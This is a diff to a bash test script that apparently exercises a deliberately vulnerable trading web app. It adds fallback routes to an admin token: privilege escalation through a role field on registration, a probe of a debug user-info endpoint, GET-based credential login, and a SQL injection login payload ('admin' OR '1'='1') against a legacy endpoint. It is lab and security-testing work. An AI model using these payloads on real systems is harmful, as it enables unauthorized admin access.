@@ -64,52 +64,84 @@ LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
     "password": "admin123"
   }')
 
+identify_and_setup_admin() {
+    WARN_MSG="$1"
+    warn "$WARN_MSG"
+
+    existing_admin=$(curl -s "$BASE_URL/api/debug/user-info" | grep -o '"username":"admin"' || true)
+    if [ -z "$existing_admin" ]; then
+        warn "Admin user not found in debug/user-info; creating admin via /api/auth/register (vulnerable to role assignment)."
+        create_admin=$(curl -s -X POST "$BASE_URL/api/auth/register" \
+          -H "Content-Type: application/json" \
+          -d '{"username":"admin","email":"admin@vulntrade.local","password":"admin123","role":"ADMIN"}')
+        info "Admin creation response: $create_admin"
+    else
+        warn "Admin user already exists but login failed; credentials may be wrong or token logic may be broken."
+    fi
+
+    LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/api/auth/login" \
+      -H "Content-Type: application/json" \
+      -d '{"username": "admin", "password": "admin123"}')
+}
+
+resolve_login_response() {
+    local resp="$1"
+    ADMIN_JWT=$(echo "$resp" | grep -o -E '"token":"[^"]*' | cut -d'"' -f4)
+    if [ -z "$ADMIN_JWT" ]; then
+        ADMIN_JWT=$(echo "$resp" | grep -o -E '"jwt":"[^"]*' | cut -d'"' -f4)
+    fi
+    ADMIN_ROLE=$(echo "$resp" | grep -o '"role":"[^\"]*' | cut -d'"' -f4)
+    ADMIN_ID=$(echo "$resp" | grep -o '"userId":[0-9]*' | cut -d':' -f2)
+    if [ -z "$ADMIN_ID" ]; then
+        ADMIN_ID=$(echo "$resp" | grep -o '"id":[0-9]*' | cut -d':' -f2)
+    fi
+}
+
 if echo "$LOGIN_RESPONSE" | grep -q -E '"token"|"jwt"'; then
     pass "Login successful"
-    ADMIN_JWT=$(echo "$LOGIN_RESPONSE" | grep -o -E '"token":"[^"]*' | cut -d'"' -f4)
-    if [ -z "$ADMIN_JWT" ]; then
-        ADMIN_JWT=$(echo "$LOGIN_RESPONSE" | grep -o -E '"jwt":"[^"]*' | cut -d'"' -f4)
+    resolve_login_response "$LOGIN_RESPONSE"
+else
+    identify_and_setup_admin "Login failed; trying fallback legacy GET auth and creating admin if needed"
+    if echo "$LOGIN_RESPONSE" | grep -q -E '"token"|"jwt"'; then
+        pass "Login successful after creation fallback"
+        resolve_login_response "$LOGIN_RESPONSE"
+    else
+        LOGIN_FALLBACK=$(curl -s -X GET "$BASE_URL/api/auth/login?username=admin&password=admin123")
+        if echo "$LOGIN_FALLBACK" | grep -q -E '"token"|"jwt"'; then
+            pass "Fallback GET login successful"
+            resolve_login_response "$LOGIN_FALLBACK"
+        else
+            warn "Fallback GET login also failed. Trying legacy SQL injection login-legacy exploit."
+            SQLI_LOGIN=$(curl -s -X POST "$BASE_URL/api/auth/login-legacy" \
+              -H "Content-Type: application/json" \
+              -d '{"username":"admin' OR '1'='1","password":"password"}')
+            if echo "$SQLI_LOGIN" | grep -q -E '"token"|"jwt"'; then
+                pass "Legacy login SQLi exploit successful"
+                resolve_login_response "$SQLI_LOGIN"
+            elif [ -n "$JWT_TOKEN" ]; then
+                warn "All admin login paths failed; using registration user token for admin checks"
+                ADMIN_JWT="$JWT_TOKEN"
+                ADMIN_ROLE="TRADER";
+                ADMIN_ID="$REGISTERED_USER_ID"
+            else
+                fail "Login failed and all fallback options exhausted"
+                exit 1
+            fi
+        fi
     fi
-    ADMIN_ROLE=$(echo "$LOGIN_RESPONSE" | grep -o '"role":"[^\"]*' | cut -d'"' -f4)
-    ADMIN_ID=$(echo "$LOGIN_RESPONSE" | grep -o '"userId":[0-9]*' | cut -d':' -f2)
-    if [ -z "$ADMIN_ID" ]; then
-        ADMIN_ID=$(echo "$LOGIN_RESPONSE" | grep -o '"id":[0-9]*' | cut -d':' -f2)
-    fi
-    info "JWT/Token obtained for admin (role: $ADMIN_ROLE, id: $ADMIN_ID)"
+fi
 
-    # Decode JWT payload to show role in claims
+if [ -n "$ADMIN_JWT" ]; then
+    info "JWT/Token obtained for admin (role: $ADMIN_ROLE, id: $ADMIN_ID)"
     JWT_PAYLOAD=$(echo "$ADMIN_JWT" | cut -d'.' -f2)
-    # Add padding if needed
     case $((${#JWT_PAYLOAD} % 4)) in
         2) JWT_PAYLOAD="${JWT_PAYLOAD}==" ;;
         3) JWT_PAYLOAD="${JWT_PAYLOAD}=" ;;
     esac
     DECODED=$(echo "$JWT_PAYLOAD" | base64 -d 2>/dev/null || echo "unable to decode")
     info "JWT Payload (decoded): $DECODED"
-else
-    warn "Login failed; trying fallback legacy GET auth and fallback to registration user token"
-    LOGIN_FALLBACK=$(curl -s -X GET "$BASE_URL/api/auth/login?username=admin&password=admin123")
-    if echo "$LOGIN_FALLBACK" | grep -q -E '"token"|"jwt"'; then
-        ADMIN_JWT=$(echo "$LOGIN_FALLBACK" | grep -o -E '"token":"[^"]*' | cut -d'"' -f4)
-        if [ -z "$ADMIN_JWT" ]; then
-            ADMIN_JWT=$(echo "$LOGIN_FALLBACK" | grep -o -E '"jwt":"[^"]*' | cut -d'"' -f4)
-        fi
-        ADMIN_ROLE=$(echo "$LOGIN_FALLBACK" | grep -o '"role":"[^\"]*' | cut -d'"' -f4)
-        ADMIN_ID=$(echo "$LOGIN_FALLBACK" | grep -o '"userId":[0-9]*' | cut -d':' -f2)
-        if [ -z "$ADMIN_ID" ]; then
-            ADMIN_ID=$(echo "$LOGIN_FALLBACK" | grep -o '"id":[0-9]*' | cut -d':' -f2)
-        fi
-        pass "Fallback login successful (GET login)"
-    elif [ -n "$JWT_TOKEN" ]; then
-        warn "Fallback login failed; using registration user token for admin checks"
-        ADMIN_JWT="$JWT_TOKEN"
-        ADMIN_ROLE="TRADER";
-        ADMIN_ID="$REGISTERED_USER_ID"
-    else
-        fail "Login failed and fallback options exhausted"
-        exit 1
-    fi
 fi
+
 echo ""
 
 # Test 3: IDOR - View Other User's Profile
